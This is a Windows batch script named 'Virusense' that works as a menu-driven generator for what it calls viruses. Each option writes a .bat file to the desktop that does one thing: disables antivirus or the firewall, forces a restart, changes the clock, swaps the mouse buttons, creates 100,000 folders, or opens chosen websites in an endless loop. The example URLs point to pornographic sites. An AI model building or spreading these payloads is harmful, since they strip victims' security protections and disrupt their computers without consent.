@echo off
chcp 65001
mode con:cols=53 lines=40

:mainmenu
cls
title Virusense ^| %USERNAME%
call :logo
echo.
echo             [40;37m┌─┐
echo             [40;32m│1│ [40;37mDisable Anti-Virus [40;31m(DANGEROUS)
echo             [40;32m└─┘
echo             [40;37m┌─┐
echo             [40;32m│2│ [40;37mPC Shutdown
echo             [40;32m└─┘
echo             [40;37m┌─┐
echo             [40;32m│3│ [40;37mClock Time [40;33m(CUSTOM)
echo             [40;32m└─┘
echo             [40;37m┌─┐
echo             [40;32m│4│ [40;37mDrug Mouse
echo             [40;32m└─┘
echo             [40;37m┌─┐
echo             [40;32m│5│ [40;37m100000 Folders [40;31m(DANGEROUS)
echo             [40;32m└─┘
echo             [40;37m┌─┐
echo             [40;32m│6│ [40;37mDisable FireWall [40;31m(DANGEROUS)
echo             [40;32m└─┘
echo             [40;37m┌─┐
echo             [40;32m│7│ [40;37mOpen Websites [40;31m(DANGEROUS) [40;33m(CUSTOM)
echo             [40;32m└─┘
echo.
set /p perguntamain="[40;37m~ [40;32m "
if %perguntamain%== 1 goto createdisableantivirus
if %perguntamain%== 2 goto createshutdownpc
if %perguntamain%== 3 goto createcustomclocktime
if %perguntamain%== 4 goto createdrugmouse
if %perguntamain%== 5 goto createalotfolders
if %perguntamain%== 6 goto createdisablefirewall
if %perguntamain%== 7 goto createinfinitewebsites
goto mainmenu



:createdisableantivirus
cls
call :logo
set /p virusname="[40;37mVirus Name ~ [40;32m "
cd %USERPROFILE%\Desktop 
echo @echo off >> %virusname%.bat
echo cls >> %virusname%.bat
echo net stop Security Center >> %virusname%.bat
goto virusgotcreated

:createshutdownpc
cls
call :logo
set /p virusname="[40;37mVirus Name ~ [40;32m "
cd %USERPROFILE%\Desktop 
echo @echo off >> %virusname%.bat
echo cls >> %virusname%.bat
echo shutdown -r -t 1 >> %virusname%.bat
goto virusgotcreated

:createcustomclocktime
cls
call :logo
set /p virusname="[40;37mVirus Name ~ [40;32m "
cls
call :logo
echo [40;37mExample ~ [40;32m00[40;37m:00
set /p clocktime1="[40;37mClock Time ~ [40;32m "
cls
call :logo
echo [40;37mExample ~ [40;37m00:[40;32m00
set /p clocktime2="[40;37mClock Time ~ [40;32m "
cd %USERPROFILE%\Desktop 
echo @echo off >> %virusname%.bat
echo cls >> %virusname%.bat
echo time %clocktime1%:%clocktime2% >> %virusname%.bat
goto virusgotcreated


:createdrugmouse
cls
call :logo
set /p virusname="[40;37mVirus Name ~ [40;32m "
cd %USERPROFILE%\Desktop 
echo @echo off >> %virusname%.bat
echo cls >> %virusname%.bat
echo rundll32 USER32.DLL,SwapMouseButton >> %virusname%.bat
goto virusgotcreated



:createalotfolders
cls
call :logo
set /p virusname="[40;37mVirus Name ~ [40;32m "
cd %USERPROFILE%\Desktop 
echo @echo off >> %virusname%.bat
echo cls >> %virusname%.bat
echo CD %userprofile%\Desktop >> %virusname%.bat
echo SET folders=100000 >> %virusname%.bat
echo SET /a name=0 >> %virusname%.bat
echo :3 >> %virusname%.bat
echo IF EXIST %folders% GOTO 4 >> %virusname%.bat
echo SET /a name=%name%+1 >> %virusname%.bat
echo MD %name% >> %virusname%.bat
echo GOTO 3 >> %virusname%.bat
echo :4 >> %virusname%.bat
echo EXIT >> %virusname%.bat
goto virusgotcreated

:createdisablefirewall
cls
call :logo
set /p virusname="[40;37mVirus Name ~ [40;32m "
cd %USERPROFILE%\Desktop 
echo @echo off >> %virusname%.bat
echo cls >> %virusname%.bat
echo net stop MpsSvc >> %virusname%.bat
echo taskkill /f /t /im FirewallControlPanel.exe >> %virusname%.bat
echo if %errorlevel%==1 tskill FirewallControlPanel >> %virusname%.bat
echo netsh firewall set opmode mode=disable >> %virusname%.bat
goto virusgotcreated

:createinfinitewebsites
cls
call :logo
set /p virusname="[40;37mVirus Name ~ [40;32m "
cls
call :logo
echo [40;37mExample ~ [40;32mhttps://www.fuq.com
set /p website1="[40;37mWebsite 1 ~ [40;32m "
cls
call :logo
echo [40;37mExample ~ [40;32mhttps://www.xvideos.com
set /p website2="[40;37mWebsite 2 ~ [40;32m "
cls
call :logo
echo [40;37mExample ~ [40;32mhttps://pornhub.com
set /p website3="[40;37mWebsite 3 ~ [40;32m "
cd %USERPROFILE%\Desktop 
echo @echo off >> %virusname%.bat
echo cls >> %virusname%.bat
echo :loop >> %virusname%.bat
echo start %website1% >> %virusname%.bat
echo start %website2% >> %virusname%.bat
echo start %website3% >> %virusname%.bat
echo goto :loop >> %virusname%.bat
goto virusgotcreated

:virusgotcreated
cls
call :logo
echo.
echo [40;32m%virusname% [40;37mVirus Got Created In :
echo [40;32m%USERPROFILE%\Desktop
pause >nul
goto mainmenu




:logo
echo [40;37m-----------------------------------------------------
echo       [40;37m▌ ▐    ▄▄▄  ▄  ▄▌[40;37m.[40;32m▄▄ [40;37m· [40;32m▄▄▄[40;37m . [40;32m▐ ▄ [40;37m.[40;32m▄▄ [40;37m· [40;32m▄▄▄ [40;37m.
echo       [40;37m█ █▌██ ▀▄ █ █ ██▌[40;32m▐█ ▀[40;37m. [40;32m▀▄[40;37m.[40;32m▀[40;37m·•[40;32m█▌▐█▐█ ▀[40;37m. [40;32m▀▄[40;37m.[40;32m▀[40;37m·
echo      [40;37m▐█▐█ ▐█ ▐▀▀▄ █▌▐█▌[40;32m▄▀▀▀█▄[40;32m▐▀▀[40;37m▪[40;32m▄▐█▐▐▌▄▀▀▀█▄▐▀▀[40;37m▪[40;32m▄
echo       [40;37m███ ▐█▌▐█ █▌▐█▄█▌[40;32m▐█▄[40;37m▪[40;32m▐█[40;32m▐█▄▄▌██▐█▌▐█▄[40;37m▪[40;32m▐█▐█▄▄▌
echo        [40;37m▀  ▀▀▀ ▀  ▀ ▀▀▀ [40;32m ▀▀▀▀ [40;32m ▀▀▀ ▀▀ █[40;37m▪ [40;32m▀▀▀▀  ▀▀▀ 
echo [40;37m-----------------------------------------------------